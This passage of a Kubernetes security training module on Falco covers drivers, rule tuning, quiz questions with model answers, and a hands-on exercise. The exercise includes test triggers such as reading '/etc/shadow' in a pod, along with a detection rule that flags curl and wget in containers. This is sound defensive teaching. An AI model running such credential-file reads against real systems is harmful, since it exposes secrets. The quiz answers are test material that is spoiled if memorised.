- **Falco can monitor anything with a plugin.** The plugin framework, introduced in Falco 0.31, extends Falco beyond syscall monitoring. A plugin can ingest events from any source — Kubernetes audit logs, AWS CloudTrail, GitHub webhooks, Okta authentication events — and make them available to Falco rules using the same condition syntax and macro/list system as kernel events. The Kubernetes audit plugin is the most widely used: it consumes the API server's audit log, enriches events with user and resource context, and enables rules like "detect when a service account creates a pod in a namespace it has never accessed before."
- **eBPF verification makes the modern probe inherently safer.** Before the kernel loads an eBPF program, it passes the program through the eBPF verifier — a static analysis engine that proves the program cannot crash the kernel, cannot loop infinitely, and cannot access memory outside its designated bounds. This verification step means that a bug in the Falco modern eBPF probe may cause Falco to miss events or crash its own userspace process, but it cannot crash the kernel or corrupt kernel memory. The kernel module has no such guarantee, which is one reason the modern eBPF probe is the recommended driver for production deployments.

## Common Mistakes

| Mistake | Problem | Solution |
|---------|---------|----------|
| Deploying default rules directly to production with paging enabled | Alert fatigue sets in within days; the team learns to ignore all Falco alerts, including real incidents | Tune rules in staging for at least one week before routing any alerts to PagerDuty; route to a log store only during the tuning period |
| Disabling noisy rules instead of adding targeted exceptions | The detection coverage for that attack vector is eliminated entirely, creating a blind spot | Add exceptions via macros, lists, or pod labels that suppress the rule only for known-safe contexts while keeping it active for everything else |
| Using the kernel module on a managed Kubernetes service that blocks module loading | Falco pods crash with driver load errors; no runtime detection is running at all | Verify node kernel and platform constraints before deploying; use `driver.kind=modern_ebpf` on GKE Autopilot, EKS Fargate, and AKS with kernel 5.8+ |
| Not enriching alerts with Kubernetes metadata | Alerts show "process X did Y" with no pod, namespace, or deployment context, making them unactionable | Enable Kubernetes metadata enrichment in the Falco configuration; confirm that `k8s.pod.name`, `k8s.ns.name`, and `container.image.repository` appear in alert outputs |
| Setting all alert outputs to the same priority level | CRITICAL alerts (active compromise) are indistinguishable from WARNING alerts (suspicious but possibly benign), leading to either over-reaction or under-reaction | Use the full priority scale: EMERGENCY/CRITICAL for active compromise indicators, WARNING/ERROR for suspicious-but-ambiguous events, NOTICE/INFORMATIONAL for tuning-phase observations |
| Not testing rules after writing them | A syntactically valid rule that references a nonexistent macro or misspelled field name silently fails to fire, creating a false sense of security | Use `falco --dry-run` to validate rule syntax and event field references; trigger test events (`kubectl run --rm -it --image=busybox -- /bin/sh`) and confirm the expected alert appears in logs |
| Treating rule tuning as a one-time task | New workloads and operational changes introduce new false positives; the detection posture degrades over time | Schedule a quarterly rule review: examine alert volume per rule, validate that every exception is still justified, and check for new default rules from the community that should be adopted |
| Running Falco without monitoring its own health | A Falco pod that is CrashLoopBackOff, has a failed driver load, or is dropping events is not providing detection coverage, but no alert tells you this | Monitor Falco's own Prometheus metrics (event rate, dropped event count, driver status) and alert on deviations from baseline; treat Falco health as a first-class site reliability signal |

## Quiz

### Question 1

A platform team deploys Falco with the default rules in production and routes all alerts to PagerDuty. Within four hours, the on-call engineer has received over 300 alerts, most of them for shell spawning in CI/CD runner pods and package manager execution in build containers. What is the correct remediation?

<details>
<summary>Answer</summary>

The team should not disable the noisy rules, because that would eliminate detection coverage for real attacks that use shells and package managers. Instead, they should add exceptions that suppress the rules for the specific, known-safe contexts: CI/CD runner pods (identified by pod label or namespace), build containers (identified by image repository), and any other workloads where these behaviors are expected by design. The exceptions should use the most specific gating mechanism available — pod labels if the workloads already carry distinguishing labels, lists if the set of safe images is small and stable, and macros if the logic requires combining multiple conditions. After adding exceptions, the team should verify in a staging environment that the exceptions work correctly before redeploying to production. They should also route alerts to a log store rather than PagerDuty during the initial tuning period to avoid burning out the on-call rotation before the rule set is calibrated.

</details>

### Question 2

Explain the tradeoffs between the kernel module driver and the modern eBPF probe for Falco. In what situations would you still choose the kernel module?

<details>
<summary>Answer</summary>

The modern eBPF probe is the recommended driver for almost all current deployments because it requires no kernel headers, does not need to be compiled at load time, is embedded in the Falco binary, and runs with a reduced set of Linux capabilities rather than full root equivalence. It also benefits from eBPF verifier safety guarantees that prevent kernel crashes. The kernel module, by contrast, requires kernel headers on the host, must be compiled for each specific kernel version, and runs with full kernel privileges — a bug in the module can crash the entire node.

The kernel module remains the right choice when the target kernel is too old to support the modern probe's required eBPF features — specifically the BPF ring buffer and BTF type information, which are generally available from kernel 5.8 onward. For example, a legacy on-premises cluster running CentOS 7 with kernel 3.10 cannot use the modern eBPF probe and must use the kernel module. The kernel module is also sometimes preferred in environments where the security team has extensively audited and validated a specific kernel module build and wants to avoid introducing a new driver into their approved software baseline.

</details>

### Question 3

Your team has tuned Falco rules over several weeks and reduced alert volume from 500/day to approximately 15/day. You are considering enabling Falco Talon to automatically delete pods on CRITICAL alerts. What factors should you evaluate before enabling automated response?

<details>
<summary>Answer</summary>

Before enabling automated pod deletion, the team should evaluate three factors. First, the false-positive rate of the specific rules that will trigger automated response. If a CRITICAL rule has a known false-positive rate of even 0.1% on a cluster handling thousands of pods, automated deletion will periodically disrupt legitimate workloads. The team should run the exact rules that will be linked to Talon in alert-only mode for at least several weeks and confirm zero false positives against production workloads before enabling automation.

Second, the blast radius of the response action. Deleting a pod that serves production traffic causes an immediate service interruption until the replacement pod is scheduled and ready. For stateless workloads behind a load balancer with multiple replicas, this impact is minimal. For stateful workloads with long startup times or singleton deployments, automated deletion can cause a meaningful outage. Talon actions should be scoped to specific namespaces, workloads, and rules where the response cost is well-understood and acceptable.

Third, the forensic cost. When Falco Talon deletes a pod, it may also destroy the evidence needed to understand what the attacker was doing. The team should configure Talon to capture a forensic snapshot — process list, network connections, a filesystem diff — before executing the destructive action, so that post-incident analysis is still possible.

</details>

### Question 4

An attacker modifies a cryptominer binary to present itself as `nginx-worker` and use HTTPS connections to a mining pool. The default Falco rule for cryptominer detection does not fire. Explain why, and describe how you would write a detection rule that would catch this attack.

<details>
<summary>Answer</summary>

The default cryptominer rule relies on signature-based detection — it checks for known miner process names (`xmrig, minerd, cpuminer`), known mining protocol strings (`stratum+tcp`), and command-line keywords (`--coin, mining`). An attacker who renames the binary, encrypts the transport, and strips identifying command-line arguments evades all of these signatures.

To catch this attack, you need behavioral rather than signature-based detection. The durable signal is not what the process is named but what it does: it consumes sustained high CPU, and it establishes outbound network connections to destinations that are not in the expected set for a web server. A behavioral rule would check for: a container running a web server image (`container.image.repository contains "nginx"` or similar) that maintains an outbound connection to a destination outside of known API endpoint allowlists, particularly on non-standard ports. This rule would fire on the miner's HTTPS connection to the mining pool regardless of the binary name or transport encryption. You can further strengthen the rule by correlating with resource metrics — sustained CPU usage above a threshold, captured through Prometheus and injected as a Falco event via the metrics plugin — though this adds operational complexity.

The lesson: signature-based rules catch known-bad; behavioral rules catch unknown-bad that deviates from known-good. A defense-in-depth rule set includes both.

</details>

### Question 5

How does the Falco plugin framework extend detection beyond system calls, and why would you integrate Kubernetes audit log events into your Falco rules?

<details>
<summary>Answer</summary>

The plugin framework allows Falco to consume events from sources other than the kernel's syscall stream. A plugin implements a standard interface that provides event data in a format Falco's rules engine can evaluate using the same condition syntax, macros, and lists available for kernel events. The most important plugin for Kubernetes security is the k8saudit plugin, which consumes the Kubernetes API server's audit log.

Integrating audit log events into Falco rules provides context that syscall monitoring alone cannot supply. A syscall-based rule can tell you that a process spawned a shell inside a container, but it cannot tell you who created that container, when it was created, or whether the container was deployed through the normal CI/CD pipeline or created directly by a compromised service account. An audit-log-based rule can detect: a service account creating pods in a namespace it has never accessed before, a user with escalated privileges modifying a ClusterRole, or a pod being created with `hostPID: true` and `privileged: true` — all of which are strong indicators of either misconfiguration or active compromise. By correlating syscall events with audit events in the same rule, you can express detections like "alert when a pod that was created outside the normal deployment pipeline spawns a shell" — a rule that would have extremely high signal.

</details>

### Question 6

Your Falco deployment has been running in production for six months. The security team notices that they have not received a Falco alert in over two weeks, despite normal operational activity on the cluster. List three possible causes for the silence and how you would diagnose each one.

<details>
<summary>Answer</summary>

Three possible causes for silent Falco in production:

First, the driver may have failed to load or may have been unloaded. If the eBPF probe or kernel module is not attached, Falco is not receiving any events and therefore cannot fire any rules. Diagnosis: check Falco pod logs for driver load errors, check `kubectl describe pod` for CrashLoopBackOff or liveness probe failures, and verify that `falco --version` inside the pod reports the driver as loaded. If the driver is failing, check whether the node's kernel was recently updated (breaking a compiled kernel module) or whether a security policy now blocks eBPF program loading.

Second, the rules may have been tuned so aggressively that they no longer fire on anything. During the tuning phase, it is possible to accumulate exceptions that are too broad — for example, a macro that exempts all pods in the `production` namespace from shell detection, or a list exception that includes a wildcard image pattern matching every container in the cluster. Diagnosis: review the current custom rules file, compare it to the version from the last known-good alert period, and run a test event (`kubectl run test-falco --image=busybox --rm -it --restart=Never -- /bin/sh`) to confirm whether the baseline shell detection rule still fires. If it does not, bisect the exceptions to find the one that is suppressing it.

Third, Falcosidekick or the alert routing pipeline may have broken downstream. Falco may be generating alerts that are written to stdout but never reaching Slack or PagerDuty because Falcosidekick is unhealthy, the webhook URL has changed, or a network policy is blocking outbound traffic from the Falco namespace. Diagnosis: check Falcosidekick pod logs for delivery errors, check `kubectl logs` on the Falco pod itself to confirm that alerts are still being written at the Falco level, and test the downstream endpoint independently (e.g., `curl` the Slack webhook URL from within the cluster to confirm reachability).

</details>

### Question 7

What is the fundamental difference between Falco's detection model and the enforcement model used by Tetragon and KubeArmor, and why would a production platform typically deploy both?

<details>
<summary>Answer</summary>

Falco is a detection tool: it observes events, evaluates them against rules, and emits alerts when suspicious behavior is detected. It does not block the behavior. The offending process completes its system call — the shell spawns, the file is read, the network connection is established — and Falco reports that it happened. This detection-only posture is safe: a false positive alert wastes human attention but does not break a production service.

Tetragon and KubeArmor are enforcement tools: they can actively prevent a system call from completing or block a process from executing based on policy. Tetragon does this by hooking eBPF programs into the kernel's syscall path and returning an error code before the call completes. KubeArmor does this by leveraging Linux Security Modules (AppArmor, SELinux, BPF-LSM) to enforce mandatory access control policies at the kernel level. An enforcement decision that is a false positive — blocking a legitimate operation — is a production outage.

Because detection is safe but slow (human response takes minutes) while enforcement is fast but risky (an automated block is instant but can break things), the mature pattern is to deploy both in a layered architecture. Falco provides broad detection coverage with low operational risk: it watches everything and alerts on anomalies. Tetragon or KubeArmor provides targeted enforcement for the small set of behaviors that are both unambiguously malicious and reliably detectable — for example, blocking any attempt to mount the host filesystem from within a container. This layered model mirrors the familiar network security pattern of deploying an IDS (detection) alongside firewall rules (enforcement), with the IDS covering the broad surface and the firewall blocking the known-bad.

</details>

## Hands-On Exercise

### Objective

Deploy Falco with the modern eBPF driver on a Kubernetes cluster, trigger and observe detection rules, tune a rule to reduce false positives, and route alerts through Falcosidekick.

### Environment Setup

```bash
# Install Falco with Falcosidekick using modern eBPF driver
helm install falco falcosecurity/falco \
  --namespace falco \
  --create-namespace \
  --set driver.kind=modern_ebpf \
  --set falcosidekick.enabled=true \
  --set falcosidekick.webui.enabled=true

# Wait for pods to be ready
kubectl wait --for=condition=ready pod -l app.kubernetes.io/name=falco -n falco --timeout=120s

# Port-forward Falcosidekick UI
kubectl port-forward svc/falco-falcosidekick-ui -n falco 2802:2802 &
```

### Tasks

1. **Verify Falco is running with the modern eBPF driver:**
   ```bash
   kubectl logs -n falco -l app.kubernetes.io/name=falco | tail -20
   ```
   Look for log lines confirming the modern eBPF probe loaded successfully. If you see errors about missing kernel features, your node's kernel may not support BPF ring buffer or BTF.

2. **Trigger the shell-in-container detection rule:**
   ```bash
   kubectl run shell-test --image=busybox --rm -it --restart=Never -- /bin/sh -c "echo detection-test"
   ```

3. **Confirm the alert appears in Falco logs:**
   ```bash
   kubectl logs -n falco -l app.kubernetes.io/name=falco | grep -i "shell"
   ```

4. **Trigger the sensitive-file-read detection rule:**
   ```bash
   kubectl run read-test --image=busybox --rm -it --restart=Never -- cat /etc/shadow
   ```

5. **View alerts in the Falcosidekick UI:**
   Open `http://localhost:2802` in a browser. Confirm that both test events appear with full Kubernetes metadata (pod name, namespace, container image).

6. **Add a custom rule to detect download tools and deploy it:**
   ```yaml
   # Create ConfigMap with custom rule
   kubectl create configmap custom-falco-rules -n falco --from-literal=rules.yaml='
   - rule: Download Tool in Container
     desc: Detect download tools that could fetch malware
     condition: >
       spawned_process and
       container and
       proc.name in (curl, wget)
     output: Download tool executed (user=%user.name command=%proc.cmdline container=%container.name)
     priority: WARNING
   '
   ```

7. **Trigger the custom rule and confirm it fires:**
   ```bash
   kubectl run curl-test --image=curlimages/curl --rm -it --restart=Never -- curl -s http://example.com
   kubectl logs -n falco -l app.kubernetes.io/name=falco | grep -i "download tool"
   ```

### Success Criteria

- [ ] Falco pod is running with the modern eBPF driver loaded (confirmed in logs)
- [ ] Shell execution in a test container is detected and logged with pod and namespace context
- [ ] Sensitive file access (`/etc/shadow`) is detected
- [ ] Events are visible in the Falcosidekick web UI with Kubernetes metadata
- [ ] The custom "Download Tool in Container" rule fires when `curl` is executed in a test container
- [ ] You can explain why the `shell-test` and `curl-test` alerts have different priority levels and what that implies for routing

### Bonus Challenge

Create a rule that detects base64 decoding — a common technique in obfuscated attacks to hide payloads — and test it:

```bash
kubectl run b64-test --image=busybox --rm -it --restart=Never -- sh -c "echo aGVsbG8= | base64 -d"
```

## Sources

- [Falco Documentation](https://falco.org/docs/) — Primary documentation covering architecture, drivers, rules, plugins, outputs, and operational guides.
- [Falco Core Repository](https://github.com/falcosecurity/falco) — Upstream source for the Falco engine, drivers (kernel module and modern eBPF probe), and userspace components.
- [CNCF Falco Project Page](https://www.cncf.io/projects/falco/) — CNCF project status, graduation date (February 29, 2024), health metrics, and community resources.
- [Falco Helm Chart README](https://github.com/falcosecurity/charts/blob/master/charts/falco/README.md) — Best allowlisted source for current installation patterns, driver selection, custom rules, and Falcosidekick integration.
- [Falco Rules Repository](https://github.com/falcosecurity/rules) — Community-maintained default rule set with MITRE ATT&CK tags, macros, and lists.
- [Falcosidekick Repository](https://github.com/falcosecurity/falcosidekick) — Alert routing daemon supporting Slack, PagerDuty, Prometheus, Loki, Elasticsearch, Kafka, AWS Lambda, and webhook outputs.
- [Falco Talon Repository](https://github.com/falcosecurity/falco-talon) — Response-action engine that executes automated remediation (pod deletion, node cordoning, forensic snapshots) on Falco alerts.
- [Falco Drivers Documentation](https://falco.org/docs/event-sources/drivers/) — Detailed comparison of kernel module and modern eBPF probe drivers, including kernel compatibility and least-privileged mode requirements.
- [Falco Rules Documentation](https://falco.org/docs/rules/) — Rule syntax reference, condition language, exception mechanisms, and the style guide for writing production-quality rules.
- [eBPF.io](https://ebpf.io/) — Introduction to eBPF technology, the CO-RE (Compile Once, Run Everywhere) paradigm, and the Linux kernel features (BPF ring buffer, BTF) that the modern probe depends on.
- [MITRE ATT&CK](https://attack.mitre.org/) — Adversary tactics and techniques framework used by Falco's default rules for attack classification and threat-hunting integration.
- [Kubernetes Auditing Documentation](https://kubernetes.io/docs/tasks/debug/debug-cluster/audit/) — Kubernetes audit log configuration, policy definition, and event structure — the data source consumed by Falco's k8saudit plugin.

## Next Module

Continue to [Module 4.4: Supply Chain Security](../module-4.4-supply-chain/) to learn about securing container images with signing, SBOMs, and vulnerability scanning. For the complementary enforcement angle — using eBPF and LSMs for in-kernel prevention rather than detection — see [Module 4.5: Tetragon & eBPF Security](../module-4.5-tetragon/).
